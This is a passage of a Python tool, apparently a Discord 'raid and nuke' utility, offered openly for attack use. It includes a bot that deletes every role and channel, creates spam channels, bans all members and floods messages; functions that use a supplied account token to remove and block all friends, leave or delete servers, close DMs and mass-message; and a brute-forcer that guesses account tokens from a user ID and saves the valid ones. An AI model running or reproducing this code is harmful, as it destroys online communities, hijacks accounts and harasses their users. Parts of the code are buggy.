                print(f'{Fore.LIGHTMAGENTA_EX}For for banning one guy write to chat: !OneBan{Fore.RESET}')
                print(f'{Fore.LIGHTMAGENTA_EX}For mass ban write to chat: !Ban{Fore.RESET}')


            client = commands.Bot(command_prefix="!")


            @client.command()
            async def Nuke(ctx):
                await ctx.message.delete()
                guild = ctx.guild


                for role in guild.roles:
                    try:
                        await role.delete()
                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{role.name} Has been deleted{Fore.RESET}')
                    except:
                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{role.name} Has not been deleted')


                for channel in guild.channels:
                    try:
                        await channel.delete()
                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{channel.name} Has been deleted')
                    except:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant delete {channel}')


                try:
                    for i in range(MAX_CHANNELS):
                        await guild.create_text_channel(chanless)
                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{chanless} has been created')
                except:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You havent got permission to create channels')


            @client.command(pass_context=True)
            async def Ban(ctx):
                await ctx.message.delete()
                guild = ctx.message.guild
                for member in list(client.get_all_members()):
                    try:
                        await guild.ban(member)
                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} User '+member.name+" has been banned")
                    except:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You havent got permission to ban :(')


            @client.command()
            async def OneBan(ctx, member : discord.Member):
                await ctx.message.delete()
                try:
                    await member.ban(reason=reason)
                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} {member} was banned')
                except:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You dont have permission to ban {member}')


            @client.event
            async def on_guild_channel_create(channel):
                while True:
                    try:
                        await channel.send(spam)
                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} SPAMMIMG :)')

                    except:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant spam')


            def thread():
                    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()
            thread()

            def thread2():
                    threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()

            thread2()

            def thread3():
                    threading.Thread(target=Ban, args=(client.run(TOKEN))).start()

            thread3()

        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 12:
        print('')
        tokenn = input("Token: ")

        print(f'''{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Server spam
{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Remove all friends
{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Block all friends
{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Spam settings
{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} Leave all servers
{Fore.LIGHTMAGENTA_EX}[6]{Fore.RESET} Close all DMs
{Fore.LIGHTMAGENTA_EX}[7]{Fore.RESET} Send mass DM
{Fore.LIGHTMAGENTA_EX}[8]{Fore.RESET} Delete all personal Servers''')

        def generate_random_string(Ammount):
            string_returned = "".join(
                random.choice(string.ascii_letters) for i in range(0, Ammount)
            )
            return string_returned

        def servers(Token):
            headers = {"authorization": Token, "user-agent": "bruh6/9"}
            for count, i in enumerate(range(0, 25)):
                payload = {"name": generate_random_string(15)}
                spam_server_request = requests.post(
                    "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
                )

        def remove_friends(Token):
            headers = {"authorization": Token, "user-agent": "bruh6/9"}
            remove_friends_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
            ).json()
            for i in remove_friends_request:
                requests.delete(
                    f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Removed Friend {i['id']}")

        def block_friends(Token):
            headers = {"authorization": Token, "user-agent": "bruh6/9"}
            json = {"type": 2}
            block_friends_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
            ).json()
            for i in block_friends_request:
                requests.put(
                    f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
                    headers=headers,
                    json=json,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Blocked Friend {i['id']}")

        def settings(Token):
            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Starting')
            for i in range(0, 100):
                headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
                condition_status = True
                payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko",
                           "message_display_compact": condition_status, "explicit_content_filter": 2,
                           "default_guilds_restricted": condition_status,
                           "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status,
                                                   "mutual_guilds": condition_status},
                           "inline_embed_media": condition_status, "inline_attachment_media": condition_status,
                           "gif_auto_play": condition_status, "render_embeds": condition_status,
                           "render_reactions": condition_status, "animate_emoji": condition_status,
                           "convert_emoticons": condition_status, "animate_stickers": 1,
                           "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status,
                           "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status,
                           "stream_notifications_enabled": condition_status, "status": "idle",
                           "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
                condition_status = False
                payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg",
                           "message_display_compact": condition_status, "explicit_content_filter": 0,
                           "default_guilds_restricted": condition_status,
                           "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status,
                                                   "mutual_guilds": condition_status},
                           "inline_embed_media": condition_status, "inline_attachment_media": condition_status,
                           "gif_auto_play": condition_status, "render_embeds": condition_status,
                           "render_reactions": condition_status, "animate_emoji": condition_status,
                           "convert_emoticons": condition_status, "animate_stickers": 2,
                           "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status,
                           "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status,
                           "stream_notifications_enabled": condition_status, "status": "dnd",
                           "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)

        def server_leave(Token):
            headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
            leave_all_servers_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
            ).json()
            for guild in leave_all_servers_request:
                requests.delete(
                    f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Left Guild: {guild['id']}")

        def dms_close(Token):
            headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
            close_dm_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
            ).json()
            for channel in close_dm_request:
                requests.delete(
                    f"https://canary.discord.com/api/v8/channels/{channel['id']}",
                    headers=headers,
                )

        def mass_dm(Token):
            headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
            mass_dm_request = requests.get(
                "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
            ).json()
            for channel in mass_dm_request:
                json = {"content": input('Message: ')}
                time.sleep(1)
                r = requests.post(
                    f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",
                    headers=headers,
                    data=json,
                )
                print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Sent DMs to {channel['id']}")

        def delete_servers(Token):
            headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
            print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Deleting...")
            delete_personal_request = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for i in delete_personal_request:
                requests.post(
                    f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
                    headers=headers,
                )
                print(i["id"])


        options = {
            "1": servers,
            "2": remove_friends,
            "3": block_friends,
            "4": settings,
            "5": server_leave,
            "6": dms_close,
            "7": mass_dm,
            "8": delete_servers
        }

        def main():
            choiceee = input("[?]> ")
            if choiceee == 1:
                servers()
            if choiceee == 2:
                remove_friends()
            if choiceee == 3:
                block_friends()
            if choiceee == 4:
                settings()
            if choiceee == 5:
                server_leave()
            if choiceee == 6:
                dms_close()
            if choiceee == 7:
                mass_dm()
            if choiceee == 8:
                delete_servers()
            else:
                options[choiceee](tokenn)

        if __name__ == "__main__":
            while 1:
                try:
                    main()
                except KeyboardInterrupt:
                    sys.exit()

        time.sleep(5)

        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 13:
        def online(token, act):
            ws = websocket.WebSocket()
            status = 'online'
            ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
            we = json.loads(ws.recv())
            innt = we['d']['heartbeat_interval']
            akt = {
                'name': act,
                'type': 0}
            headerrrr = {'op': 2,
                    'd': {'token': token,
                          'properties': {'$os': sys.platform,
                                         '$browser': 'RTB',
                                         '$device': f"{sys.platform} Device"
                                         },
                          'presence': {'game': akt,
                                       'status': status,
                                       'since': 0,
                                       'afk': False
                                       }
                          },
                    's': None,
                    't': None}
            ws.send(json.dumps(headerrrr))
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Set status as: ' + act)
            ackt = {'op': 1,
                   'd': None}
            while 1:
                time.sleep(innt / 1000)
                ws.send(json.dumps(ackt))

        text = input(f"Activity Status: ")
        tokens = open('tokens.txt', 'r').read().splitlines()
        for token in tokens:
            threading.Thread(target=online, args=(token, text)).start()


        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()

    if choice == 14:

        print('Do not do this without the permission of the person to whom the bruteforce attack is conducted.')

        id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]


        def bruteforece():
            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                            '').join(random.choices(string.ascii_letters + string.digits, k=25))


                headers = {'Authorization': token}


                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} VALID' + ' ' + token)
                        f = open('grab.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} INVALID' + ' ' + token)
                finally:
                    print('')


        def thread():
            while True:
                threading.Thread(target=bruteforece).start()


        thread()


        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 15:
        print(f'''{Fore.LIGHTMAGENTA_EX}Wassup buddy. This is fun made tool by Lososik...      
If you have got some problems join https://dsc.gg/deadd or contact Lososik#0954.
Enjoy Raiding and Nuking :D
Special thanks to H0LLOW for helping me with a few things.
{Fore.RESET}''')


        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 16:
        quit('')

spammer()
